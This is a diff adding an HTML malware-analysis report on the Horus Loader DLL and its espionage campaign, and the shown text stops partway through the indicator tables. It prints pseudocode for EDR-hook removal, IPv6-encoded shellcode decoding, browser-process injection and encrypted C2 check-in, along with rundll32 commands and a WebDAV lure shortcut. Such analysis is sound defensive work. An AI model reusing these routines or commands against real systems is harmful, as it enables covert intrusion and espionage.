@@ -1,0 +1,620 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="description" content="Technical reverse-engineering report for the Horus Agent and Horus Loader DLL component.">
+  <title>Horus Loader DLL | Reverse-Engineering Report</title>
+  <style>
+    :root {
+      --bg: #09090d;
+      --panel: #111118;
+      --panel-2: #171720;
+      --line: #2a2934;
+      --text: #f0eef5;
+      --muted: #aaa6b4;
+      --dim: #777381;
+      --accent: #ff3e87;
+      --accent-2: #a855f7;
+      --teal: #43d8c9;
+      --amber: #ffbf69;
+      --red: #ff647c;
+      --green: #72e6a6;
+      --code: #0b0b11;
+      --max: 1240px;
+      --sans: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      --mono: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    }
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; scroll-padding-top: 28px; }
+    body {
+      margin: 0;
+      background:
+        radial-gradient(circle at 82% 8%, rgba(168, 85, 247, .13), transparent 27rem),
+        radial-gradient(circle at 4% 28%, rgba(255, 62, 135, .09), transparent 24rem),
+        var(--bg);
+      color: var(--text);
+      font: 15px/1.68 var(--sans);
+    }
+    a { color: var(--teal); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    code, pre { font-family: var(--mono); }
+    .wrap { width: min(calc(100% - 36px), var(--max)); margin-inline: auto; }
+    .topbar {
+      border-bottom: 1px solid var(--line);
+      background: rgba(9, 9, 13, .84);
+      backdrop-filter: blur(14px);
+      position: sticky;
+      top: 0;
+      z-index: 20;
+    }
+    .topbar-inner { height: 58px; display: flex; align-items: center; justify-content: space-between; gap: 18px; }
+    .brand { display: flex; align-items: center; gap: 10px; color: var(--text); font-weight: 760; letter-spacing: .06em; text-transform: uppercase; }
+    .brand-mark { width: 25px; height: 25px; border: 1px solid var(--accent); position: relative; transform: rotate(45deg); }
+    .brand-mark::after { content: ""; position: absolute; inset: 5px; border: 1px solid var(--accent-2); }
+    .top-actions { display: flex; gap: 8px; }
+    button {
+      border: 1px solid var(--line);
+      background: var(--panel);
+      color: var(--text);
+      border-radius: 8px;
+      padding: 8px 12px;
+      font: 650 12px/1 var(--sans);
+      cursor: pointer;
+    }
+    button:hover { border-color: var(--accent); }
+    .hero { padding: 78px 0 50px; border-bottom: 1px solid var(--line); }
+    .eyebrow { color: var(--accent); font: 700 12px/1.2 var(--mono); letter-spacing: .14em; text-transform: uppercase; }
+    h1 { max-width: 940px; margin: 18px 0 18px; font-size: clamp(40px, 7vw, 80px); line-height: .98; letter-spacing: -.045em; }
+    .hero-lede { max-width: 830px; margin: 0; color: #c6c2cd; font-size: 18px; line-height: 1.6; }
+    .hero-meta { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); margin-top: 42px; border: 1px solid var(--line); background: rgba(17,17,24,.75); }
+    .meta-item { min-height: 112px; padding: 20px; border-right: 1px solid var(--line); }
+    .meta-item:last-child { border-right: 0; }
+    .meta-label { color: var(--dim); font: 650 11px/1.3 var(--mono); letter-spacing: .09em; text-transform: uppercase; }
+    .meta-value { margin-top: 10px; font-weight: 720; overflow-wrap: anywhere; }
+    .status { display: inline-flex; align-items: center; gap: 7px; color: var(--green); }
+    .status::before { content: ""; width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 14px var(--green); }
+    .disclosure { margin-top: 18px; border-left: 3px solid var(--amber); background: rgba(255,191,105,.07); color: #d7c9b1; padding: 14px 17px; }
+    .layout { display: grid; grid-template-columns: 240px minmax(0, 1fr); gap: 54px; padding: 54px 0 90px; }
+    aside { position: sticky; top: 82px; align-self: start; }
+    .toc-title { color: var(--dim); font: 700 11px/1.2 var(--mono); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc { list-style: none; padding: 0; margin: 0; border-left: 1px solid var(--line); }
+    .toc li { margin: 0; }
+    .toc a { display: block; padding: 7px 0 7px 15px; color: var(--muted); font-size: 13px; }
+    .toc a:hover, .toc a.active { color: var(--text); border-left: 2px solid var(--accent); margin-left: -1px; text-decoration: none; }
+    .section { padding: 0 0 62px; border-bottom: 1px solid var(--line); margin-bottom: 62px; }
+    .section:last-child { border-bottom: 0; margin-bottom: 0; }
+    .section-kicker { color: var(--accent); font: 700 11px/1.2 var(--mono); letter-spacing: .12em; text-transform: uppercase; }
+    h2 { margin: 10px 0 24px; font-size: clamp(28px, 4vw, 46px); line-height: 1.1; letter-spacing: -.03em; }
+    h3 { margin: 34px 0 13px; font-size: 21px; line-height: 1.25; }
+    h4 { margin: 22px 0 9px; color: #dedbe5; font-size: 15px; }
+    p { margin: 0 0 18px; }
+    .lead { color: #cbc7d2; font-size: 17px; max-width: 830px; }
+    .cards { display: grid; grid-template-columns: repeat(2, minmax(0,1fr)); gap: 14px; margin: 26px 0; }
+    .card { border: 1px solid var(--line); background: linear-gradient(145deg, rgba(23,23,32,.98), rgba(17,17,24,.92)); padding: 21px; }
+    .card-no { color: var(--accent); font: 700 11px/1 var(--mono); }
+    .card h3 { margin: 10px 0 8px; font-size: 18px; }
+    .card p { margin: 0; color: var(--muted); font-size: 14px; }
+    .callout { margin: 24px 0; padding: 20px 22px; border: 1px solid rgba(255,62,135,.35); background: rgba(255,62,135,.055); }
+    .callout strong { color: var(--accent); }
+    .hash-box { display: grid; grid-template-columns: 130px 1fr auto; gap: 12px; align-items: center; border: 1px solid var(--line); background: var(--panel); padding: 13px 15px; margin: 20px 0; }
+    .hash-box .label { color: var(--dim); font: 700 11px var(--mono); }
+    .hash-box code { overflow-wrap: anywhere; color: var(--teal); font-size: 12px; }
+    .table-wrap { overflow-x: auto; margin: 22px 0 28px; border: 1px solid var(--line); }
+    table { width: 100%; border-collapse: collapse; min-width: 650px; background: rgba(17,17,24,.72); }
+    th { text-align: left; color: var(--dim); background: var(--panel-2); font: 700 11px/1.3 var(--mono); letter-spacing: .06em; text-transform: uppercase; }
+    th, td { padding: 13px 15px; border-bottom: 1px solid var(--line); vertical-align: top; }
+    tr:last-child td { border-bottom: 0; }
+    td { color: #d2ced8; }
+    td code { color: #e6d5ef; font-size: 12px; overflow-wrap: anywhere; }
+    .tag { display: inline-block; border: 1px solid var(--line); border-radius: 999px; padding: 3px 8px; color: var(--muted); font: 650 10px var(--mono); text-transform: uppercase; white-space: nowrap; }
+    .tag.high { color: var(--green); border-color: rgba(114,230,166,.38); }
+    .tag.context { color: var(--amber); border-color: rgba(255,191,105,.38); }
+    .chain { margin: 28px 0; display: grid; gap: 0; }
+    .chain-step { display: grid; grid-template-columns: 44px 1fr; gap: 16px; position: relative; }
+    .chain-step:not(:last-child)::before { content: ""; position: absolute; left: 21px; top: 42px; bottom: -4px; width: 1px; background: linear-gradient(var(--accent), var(--accent-2)); }
+    .chain-num { width: 43px; height: 43px; border: 1px solid var(--accent); border-radius: 50%; display: grid; place-items: center; color: var(--accent); font: 700 12px var(--mono); background: var(--bg); z-index: 1; }
+    .chain-body { padding: 5px 0 25px; }
+    .chain-body h3 { margin: 0 0 5px; font-size: 17px; }
+    .chain-body p { color: var(--muted); margin: 0; }
+    .code-panel { margin: 20px 0 30px; border: 1px solid var(--line); background: var(--code); }
+    .code-head { display: flex; justify-content: space-between; align-items: center; padding: 10px 13px; border-bottom: 1px solid var(--line); background: #121219; }
+    .code-title { color: var(--muted); font: 650 11px/1.2 var(--mono); }
+    .copy { padding: 6px 9px; font-size: 10px; }
+    pre { margin: 0; padding: 18px; overflow: auto; color: #d9d5df; font-size: 12px; line-height: 1.62; tab-size: 4; }
+    .comment { color: #7fba8d; }
+    .keyword { color: #db85ff; }
+    .string { color: #e7b875; }
+    .citation { margin-top: -18px; color: var(--dim); font: 11px/1.5 var(--mono); }
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; }
+    ul.clean { margin: 12px 0 24px; padding-left: 20px; }
+    ul.clean li { margin: 7px 0; color: #ccc8d2; }
+    .quote { border-left: 2px solid var(--accent-2); padding: 6px 0 6px 18px; margin: 20px 0; color: #d8d3df; }
+    .quote code { color: var(--teal); }
+    .footer { border-top: 1px solid var(--line); padding: 28px 0 42px; color: var(--dim); font-size: 12px; }
+    .footer-inner { display: flex; justify-content: space-between; gap: 20px; }
+    .back { position: fixed; right: 18px; bottom: 18px; width: 38px; height: 38px; border-radius: 50%; display: grid; place-items: center; opacity: 0; pointer-events: none; transition: opacity .2s; }
+    .back.show { opacity: 1; pointer-events: auto; }
+    @media (max-width: 900px) {
+      .hero-meta { grid-template-columns: 1fr 1fr; }
+      .meta-item:nth-child(2) { border-right: 0; }
+      .meta-item:nth-child(-n+2) { border-bottom: 1px solid var(--line); }
+      .layout { grid-template-columns: 1fr; }
+      aside { position: static; }
+      .toc { columns: 2; }
+      .two-col { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 620px) {
+      .wrap { width: min(calc(100% - 24px), var(--max)); }
+      .hero { padding-top: 50px; }
+      .hero-meta, .cards { grid-template-columns: 1fr; }
+      .meta-item { border-right: 0; border-bottom: 1px solid var(--line); }
+      .meta-item:last-child { border-bottom: 0; }
+      .toc { columns: 1; }
+      .hash-box { grid-template-columns: 1fr; }
+      .top-actions .secondary { display: none; }
+      .footer-inner { flex-direction: column; }
+    }
+    @media print {
+      :root { color-scheme: light; --bg:#fff; --panel:#f5f5f7; --panel-2:#ececf0; --line:#d2d2d8; --text:#17171c; --muted:#4f4f58; --dim:#666670; --code:#f6f6f8; }
+      body { background: #fff; font-size: 10.5pt; }
+      .topbar, aside, .back, .copy { display: none !important; }
+      .hero { padding: 30px 0 24px; }
+      .layout { display: block; padding-top: 30px; }
+      .section { break-inside: auto; }
+      .card, .callout, .code-panel, .table-wrap, .chain-step { break-inside: avoid; }
+      a { color: #5a197b; }
+      pre { white-space: pre-wrap; word-break: break-word; color: #222; }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar" id="top">
+    <div class="wrap topbar-inner">
+      <div class="brand"><span class="brand-mark" aria-hidden="true"></span><span>Malware Research</span></div>
+      <div class="top-actions">
+        <button class="secondary" type="button" onclick="copyHash(this)">Copy SHA-256</button>
+        <button type="button" onclick="window.print()">Print/Save PDF</button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="wrap">
+        <div class="eyebrow">Reverse-Engineering Report · 02 November 2026</div>
+        <h1>Horus Agent/Horus Loader DLL Component</h1>
+        <p class="hero-lede">Technical analysis of a 64-bit Windows loader that functions as an intermediate stage in the Horus espionage toolset, including execution flow, C2 handling, payload reconstruction, process injection, evasion behavior, and recovered indicators.</p>
+
+        <div class="hero-meta">
+          <div class="meta-item"><div class="meta-label">Sample</div><div class="meta-value">PE32+ DLL · AMD64<br>116,680 bytes</div></div>
+          <div class="meta-item"><div class="meta-label">Internal name</div><div class="meta-value"><code>qMybVH.dll</code></div></div>
+          <div class="meta-item"><div class="meta-label">Family</div><div class="meta-value">Horus Loader/Agent</div></div>
+          <div class="meta-item"><div class="meta-label">Attribution confidence</div><div class="meta-value"><span class="status">High</span></div></div>
+        </div>
+      </div>
+    </section>
+
+    <div class="wrap layout">
+      <aside aria-label="Report navigation">
+        <div class="toc-title">Contents</div>
+        <ol class="toc">
+          <li><a href="#summary">Executive summary</a></li>
+          <li><a href="#findings">Key findings</a></li>
+          <li><a href="#profile">Sample profile</a></li>
+          <li><a href="#chain">Execution chain</a></li>
+          <li><a href="#c2">C2 operations</a></li>
+          <li><a href="#code">Technical deep dive</a></li>
+          <li><a href="#evasion">Defense evasion</a></li>
+          <li><a href="#iocs">Indicators</a></li>
+          <li><a href="#artifacts">Additional artefacts</a></li>
+        </ol>
+      </aside>
+
+      <article>
+        <section class="section" id="summary">
+          <div class="section-kicker">01 · Overview</div>
+          <h2>Executive Summary</h2>
+          <p class="lead">The sample is a virtualized Windows DLL that prepares and launches a Horus Agent payload. Its core behavior combines environment checks, user-mode hook removal, IPv6-encoded payload reconstruction, browser-process injection, and encrypted Mythic-compatible command and control.</p>
+          <div class="hash-box">
+            <span class="label">SHA-256</span>
+            <code id="sample-hash">8065c85e387654cb79a12405ff0f99fd4ddd5a5d3b9876986b82822bd10c716f</code>
+            <button type="button" onclick="copyHash(this)">Copy</button>
+          </div>
+          <p>The DLL executes through exported entry points invoked by <code>rundll32.exe</code>. Before staging the agent, it checks for sandboxes, hypervisors, and security products; restores clean system-library code in memory; decodes shellcode stored as IPv6 text; and writes the payload into <code>msedge.exe</code> or <code>chrome.exe</code> in 1,024-byte chunks.</p>
+          <p>The sample is attributed to Stealth Falcon, also tracked as FruityArmor, and connected to a campaign exploiting CVE-2025-33053 against government and defense targets in Turkey, Qatar, Egypt, and Yemen.</p>
+          <div class="callout"><strong>Operational significance:</strong> The loader is designed to make static inspection difficult and to reduce visibility from user-mode security hooks before the backdoor begins C2 activity.</div>
+        </section>
+
+        <section class="section" id="findings">
+          <div class="section-kicker">02 · Findings</div>
+          <h2>Key Findings</h2>
+          <div class="cards">
+            <div class="card"><div class="card-no">FINDING 01</div><h3>Virtualized loader</h3><p>Code Virtualizer and control-flow flattening obscure control flow, strings, API resolution, and critical loader routines.</p></div>
+            <div class="card"><div class="card-no">FINDING 02</div><h3>EDR hook removal</h3><p>The loader maps clean copies of system DLLs and restores executable code in memory before later stages run.</p></div>
+            <div class="card"><div class="card-no">FINDING 03</div><h3>IPv6 payload encoding</h3><p>Executable bytes are represented as valid IPv6 strings and reconstructed with <code>RtlIpv6StringToAddressA</code>.</p></div>
+            <div class="card"><div class="card-no">FINDING 04</div><h3>Chunked process injection</h3><p>Shellcode is written into browser processes in 0x400-byte blocks, then started with <code>NtCreateThreadEx</code>.</p></div>
+            <div class="card"><div class="card-no">FINDING 05</div><h3>Mythic-compatible C2</h3><p>The agent performs encrypted check-in, polls for tasks, and supports survey, file transfer, and shellcode-injection commands.</p></div>
+            <div class="card"><div class="card-no">FINDING 06</div><h3>Certificate masquerade</h3><p>Version resources imitate an NVIDIA graphics component, while the Authenticode material is invalid or revoked.</p></div>
+          </div>
+        </section>
+
+        <section class="section" id="profile">
+          <div class="section-kicker">03 · File analysis</div>
+          <h2>Sample Profile</h2>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Property</th><th>Value</th></tr></thead>
+              <tbody>
+                <tr><td>Format</td><td>64-bit Windows DLL, PE32+, AMD64</td></tr>
+                <tr><td>Size</td><td>116,680 bytes</td></tr>
+                <tr><td>Internal export name</td><td><code>qMybVH.dll</code></td></tr>
+                <tr><td>Compiler</td><td>Microsoft Visual C/C++ 17.00.60610</td></tr>
+                <tr><td>Linker</td><td>Microsoft Linker 11.00.60610</td></tr>
+                <tr><td>Protection</td><td>Code Virtualizer; OLLVM-derived flattening, shift-cipher strings, and API hashing</td></tr>
+                <tr><td>Version-resource text</td><td><code>N Vidia. All rights reserved.</code><br><code>Graphics component</code></td></tr>
+                <tr><td>Signing identity</td><td>RHM LIMITED; Sectigo RSA Code Signing CA</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <h3>Masquerade strings</h3>
+          <div class="quote"><code>qMybVH.dll</code><br><span>Internal module name retained in the export directory.</span></div>
+          <div class="quote"><code>N Vidia. All rights reserved.</code><br><span>Version-resource copyright string using a spaced rendering of NVIDIA.</span></div>
+          <div class="quote"><code>Graphics component</code><br><span>File-description text intended to resemble a display-driver component.</span></div>
+        </section>
+
+        <section class="section" id="chain">
+          <div class="section-kicker">04 · Activity flow</div>
+          <h2>Execution Chain</h2>
+          <p class="lead">A WebDAV lure is followed by DLL execution, environment validation, payload recovery, browser-process injection, and encrypted agent check-in.</p>
+          <div class="chain">
+            <div class="chain-step"><div class="chain-num">01</div><div class="chain-body"><h3>WebDAV lure</h3><p>An Internet Shortcut launches <code>iediagcmd.exe</code> with its working directory set to a remote WebDAV path associated with <code>summerartcamp[.]net</code>.</p></div></div>
+            <div class="chain-step"><div class="chain-num">02</div><div class="chain-body"><h3>DLL staging and execution</h3><p>The chain places DLLs such as <code>attachment.dll</code> or <code>init.dll</code> and invokes an ordinal or <code>CPlApplet</code> export with <code>rundll32.exe</code>.</p></div></div>
+            <div class="chain-step"><div class="chain-num">03</div><div class="chain-body"><h3>Environment validation</h3><p>Running processes are compared with more than 100 hashed names associated with 17 security vendors; execution stops when a match is found.</p></div></div>
+            <div class="chain-step"><div class="chain-num">04</div><div class="chain-body"><h3>System-library restoration</h3><p>Clean copies of <code>ntdll.dll</code> and <code>kernel32.dll</code> are mapped from disk to replace hooked in-memory code.</p></div></div>
+            <div class="chain-step"><div class="chain-num">05</div><div class="chain-body"><h3>Payload reconstruction</h3><p>IPv6-formatted strings are decoded into contiguous shellcode by <code>RtlIpv6StringToAddressA</code>.</p></div></div>
+            <div class="chain-step"><div class="chain-num">06</div><div class="chain-body"><h3>Injection and agent start</h3><p>The reconstructed payload is written into Chrome or Edge in 1,024-byte chunks and started with a native remote-thread API.</p></div></div>
+            <div class="chain-step"><div class="chain-num">07</div><div class="chain-body"><h3>Mythic check-in</h3><p>The agent builds a registration message, encrypts it, adds an HMAC, and sends it over HTTPS before polling for tasking.</p></div></div>
+          </div>
+
+          <h3>Loader commands</h3>
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">Windows command line · execution examples</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code><span class="comment">:: Export ordinal execution</span>
+rundll32.exe "attachment.dll",#1
+
+<span class="comment">:: Control Panel applet export</span>
+rundll32.exe "init.dll",CPlApplet
+
+<span class="comment">:: Shell32 proxy invocation</span>
+rundll32.exe shell32.dll,Control_RunDLL "init.dll"
+
+<span class="comment">:: Temporary DLL execution</span>
+rundll32.exe "C:\Users\&lt;USER&gt;\AppData\Local\Temp\e892839eb1df091ef5279e8a2af9a002.dll",DllMain</code></pre>
+          </div>
+
+          <h3>Internet Shortcut configuration</h3>
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">Internet Shortcut · lure configuration</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>[InternetShortcut]
+URL=C:\Program Files\Internet Explorer\iediagcmd.exe
+WorkingDirectory=\\summerartcamp[.]net@ssl@443\DavWWWRoot\OSYxaOjr
+ShowCommand=7
+IconIndex=13
+IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+Modified=20F06BA06D07BD014D</code></pre>
+          </div>
+        </section>
+
+        <section class="section" id="c2">
+          <div class="section-kicker">05 · Command and control</div>
+          <h2>C2 Operations</h2>
+          <p class="lead">The implant uses an HTTPS transport compatible with the Mythic framework. Registration and tasking data use AES-CBC encryption with HMAC-SHA256 integrity protection.</p>
+          <div class="two-col">
+            <div>
+              <h3>Registration routine</h3>
+              <p><code>sub_180004120</code> resolves an encrypted endpoint, opens a WinINet HTTPS session, prepares a Mythic-style check-in envelope, encrypts it, and submits it to the configured path.</p>
+              <ul class="clean">
+                <li>RVA: <code>0x00004120</code></li>
+                <li>File offset: <code>0x00003520</code></li>
+                <li>Transport: HTTPS over TCP 443</li>
+                <li>Crypto: AES-128/256-CBC and HMAC-SHA256</li>
+              </ul>
+            </div>
+            <div>
+              <h3>Task dispatcher</h3>
+              <p><code>sub_180005280</code> validates and decrypts inbound envelopes, parses JSON task data, and routes commands through an internal switch table.</p>
+              <ul class="clean">
+                <li><code>0x101</code> survey/host fingerprinting</li>
+                <li><code>0x102</code> directory and file listing</li>
+                <li><code>0x103</code> download/staging</li>
+                <li><code>0x104</code> upload</li>
+                <li><code>0x201</code> chunked shellcode injection</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">C-like pseudocode · C2 registration</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>__int64 sub_180004120(SessionContext *ctx)
+{
+    unsigned char aesKey[32], hmacKey[32];
+
+    resolve_config(ctx-&gt;EncryptedDomainBlob, ctx-&gt;ResolvedC2Host);
+    extract_session_keys(aesKey, hmacKey);
+
+    HINTERNET session = InternetOpenW(ctx-&gt;UserAgent,
+        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET connect = InternetConnectW(session, ctx-&gt;ResolvedC2Host,
+        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET request = HttpOpenRequestW(connect, L"POST", ctx-&gt;BeaconEndpoint,
+        NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
+
+    build_registration(ctx, &amp;ctx-&gt;RegistrationPayload);
+    encrypt_and_sign(&amp;ctx-&gt;RegistrationPayload, aesKey, hmacKey);
+
+    return HttpSendRequestW(request, ctx-&gt;HttpHeaders, -1,
+        ctx-&gt;RegistrationPayload.Buffer, ctx-&gt;RegistrationPayload.Length);
+}</code></pre>
+          </div>
+          <p class="citation"><code>sub_180004120</code> · RVA 0x00004120 · file offset 0x00003520.</p>
+
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">C-like pseudocode · task dispatch</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>void sub_180005280(MythicTaskEnvelope *task)
+{
+    switch (task-&gt;CommandId) {
+        case 0x101: run_survey(task);            break;
+        case 0x102: list_directory(task);        break;
+        case 0x103: stage_download(task);        break;
+        case 0x104: receive_upload(task);        break;
+        case 0x201: inject_shellcode(task);      break;
+        default:    task-&gt;StatusCode = STATUS_UNKNOWN_COMMAND;
+    }
+}</code></pre>
+          </div>
+          <p class="citation"><code>sub_180005280</code> · RVA 0x00005280 · file offset 0x00004680.</p>
+        </section>
+
+        <section class="section" id="code">
+          <div class="section-kicker">06 · Reverse engineering</div>
+          <h2>Technical Deep Dive</h2>
+
+          <h3>6.1 Clean system-DLL remapping</h3>
+          <p>The loader opens <code>C:\Windows\System32\ntdll.dll</code>, creates an image mapping, and replaces executable code in the loaded module to remove user-mode EDR hooks.</p>
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">C-like pseudocode · NTDLL restoration</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>PVOID sub_180001850(void)
+{
+    HANDLE file = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE section = CreateFileMappingW(file, NULL,
+        PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    PVOID clean = MapViewOfFile(section, FILE_MAP_READ, 0, 0, 0);
+    PVOID loaded = GetModuleHandleW(L"ntdll.dll");
+
+    <span class="comment">// Locate executable section, make it writable, copy clean bytes,</span>
+    <span class="comment">// then restore its original memory protection.</span>
+    restore_text_section(loaded, clean);
+
+    UnmapViewOfFile(clean);
+    CloseHandle(section);
+    CloseHandle(file);
+    return loaded;
+}</code></pre>
+          </div>
+          <p class="citation"><code>sub_180001850</code> · RVA 0x00001850 · file offset 0x00000C50.</p>
+
+          <h3>6.2 IPv6 payload reconstruction</h3>
+          <p>Each valid IPv6 string produces 16 bytes. Repeating the conversion and concatenating the results reconstructs the payload without storing a conventional executable blob in the file.</p>
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">C-like pseudocode · IPfuscation decoder</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>BOOL sub_1800021A0(const char **table, DWORD count,
+                       PBYTE output, SIZE_T *outputSize)
+{
+    DWORD offset = 0;
+    for (DWORD i = 0; i &lt; count; ++i) {
+        IN6_ADDR address;
+        LPCSTR terminator = NULL;
+
+        if (RtlIpv6StringToAddressA(table[i], &amp;terminator, &amp;address) != 0)
+            return FALSE;
+
+        memcpy(output + offset, address.u.Byte, 16);
+        offset += 16;
+    }
+    *outputSize = offset;
+    return TRUE;
+}</code></pre>
+          </div>
+          <p class="citation"><code>sub_1800021A0</code> · RVA 0x000021A0 · file offset 0x000015A0.</p>
+
+          <h3>6.3 Security-process blacklist</h3>
+          <p>A Toolhelp process snapshot is compared with a global table of more than 100 precomputed name hashes covering 17 security vendors. A match causes the loader to stop before network or file-modification activity.</p>
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">C-like pseudocode · process checks</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>BOOL sub_180003020(void)
+{
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W process = { .dwSize = sizeof(PROCESSENTRY32W) };
+
+    if (Process32FirstW(snapshot, &amp;process)) {
+        do {
+            DWORD hash = hash_process_name(process.szExeFile);
+            if (hash_in_security_table(hash)) {
+                CloseHandle(snapshot);
+                return TRUE;
+            }
+        } while (Process32NextW(snapshot, &amp;process));
+    }
+    CloseHandle(snapshot);
+    return FALSE;
+}</code></pre>
+          </div>
+          <p class="citation"><code>sub_180003020</code> · RVA 0x00003020 · file offset 0x00002420.</p>
+
+          <h3>6.4 Chunked browser-process injection</h3>
+          <p>The routine allocates executable memory in the target, transfers the payload in 0x400-byte writes, and starts a remote thread. Chrome and Microsoft Edge are the target processes.</p>
+          <div class="code-panel">
+            <div class="code-head"><span class="code-title">C-like pseudocode · chunked injection</span><button class="copy" type="button" onclick="copyCode(this)">Copy</button></div>
+            <pre><code>BOOL sub_1800080B0(HANDLE target, PBYTE payload, SIZE_T size)
+{
+    PVOID remote = VirtualAllocEx(target, NULL, size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remote) return FALSE;
+
+    const SIZE_T chunk = 0x400;
+    for (SIZE_T offset = 0; offset &lt; size; offset += chunk) {
+        SIZE_T length = min(chunk, size - offset);
+        if (!WriteProcessMemory(target, (PBYTE)remote + offset,
+                payload + offset, length, NULL))
+            return FALSE;
+    }
+
+    HANDLE thread = NULL;
+    NtCreateThreadEx(&amp;thread, THREAD_ALL_ACCESS, NULL,
+        target, remote, NULL, 0, 0, 0, 0, NULL);
+    return thread != NULL;
+}</code></pre>
+          </div>
+          <p class="citation"><code>sub_1800080B0</code> · RVA 0x000080B0 · file offset 0x000074B0.</p>
+        </section>
+
+        <section class="section" id="evasion">
+          <div class="section-kicker">07 · ATT&amp;CK context</div>
+          <h2>Defense-Evasion Patterns</h2>
+          <p>The table maps the malware behaviors to MITRE ATT&amp;CK techniques.</p>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Technique</th><th>Tactic</th><th>Behavior</th><th>Code location</th></tr></thead>
+              <tbody>
+                <tr><td><code>T1218.011</code><br>Rundll32</td><td>Defense Evasion</td><td>Executes loader exports through <code>rundll32.exe</code>.</td><td><code>loader_entry</code> · RVA 0x1010</td></tr>
+                <tr><td><code>T1027.002</code><br>Software Packing</td><td>Defense Evasion</td><td>Code Virtualizer protects critical routines and obscures control flow.</td><td>Entire binary</td></tr>
+                <tr><td><code>T1027</code><br>Obfuscated Files or Information</td><td>Defense Evasion</td><td>Payload bytes are represented as IPv6 strings and decoded at runtime.</td><td><code>sub_1800021A0</code></td></tr>
+                <tr><td><code>T1055</code><br>Process Injection</td><td>Defense Evasion/Privilege Escalation</td><td>Writes payload chunks into Chrome or Edge and starts a remote thread.</td><td><code>sub_1800080B0</code></td></tr>
+                <tr><td><code>T1562.001</code><br>Impair Defenses</td><td>Defense Evasion</td><td>Restores clean system-library code to remove user-mode hooks.</td><td><code>sub_180001850</code></td></tr>
+                <tr><td><code>T1497.001</code><br>System Checks</td><td>Defense Evasion/Discovery</td><td>Compares active processes with a hashed security-tool blacklist.</td><td><code>sub_180003020</code></td></tr>
+                <tr><td><code>T1036.001</code><br>Invalid Code Signature</td><td>Defense Evasion</td><td>Uses misleading NVIDIA-like resources and invalid signing material.</td><td>Authenticode directory · offset 0x1A800</td></tr>
+                <tr><td><code>T1573.001</code><br>Symmetric Cryptography</td><td>Command and Control</td><td>Encrypts and authenticates Mythic-compatible traffic.</td><td><code>sub_180004120</code></td></tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <section class="section" id="iocs">
+          <div class="section-kicker">08 · Artefact register</div>
+          <h2>Indicators of Compromise</h2>
+          <p class="lead">Network values are defanged.</p>
+
+          <h3>Network indicators</h3>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Type</th><th>Indicator</th><th>Role</th></tr></thead>
+              <tbody>
+                <tr><td>Domain</td><td><code>fastfilebackup[.]com</code></td><td>Horus C2</td></tr>
+                <tr><td>Domain</td><td><code>summerartcamp[.]net</code></td><td>WebDAV staging server</td></tr>
+                <tr><td>Domain</td><td><code>assets[.]adobedtm[.]com</code></td><td>Network telemetry</td></tr>
+                <tr><td>Domain</td><td><code>a1672[.]dscr[.]akamai[.]net</code></td><td>Network telemetry</td></tr>
+                <tr><td>Port</td><td><code>TCP 443</code></td><td>HTTPS/WebDAV over SSL</td></tr>
+                <tr><td>User-Agent</td><td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ... Chrome/134.0.6998.36 Safari/537.36</code></td><td>C2 request header</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>Host indicators and observables</h3>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Type</th><th>Value</th><th>Behavior</th></tr></thead>
+              <tbody>
+                <tr><td>File</td><td><code>C:\Windows\8wx40bam.exe</code></td><td>Created during staging</td></tr>
+                <tr><td>File</td><td><code>attachment.dll</code></td><td>Loader/stager filename</td></tr>
+                <tr><td>File</td><td><code>init.dll</code></td><td>Loader/stager filename</td></tr>
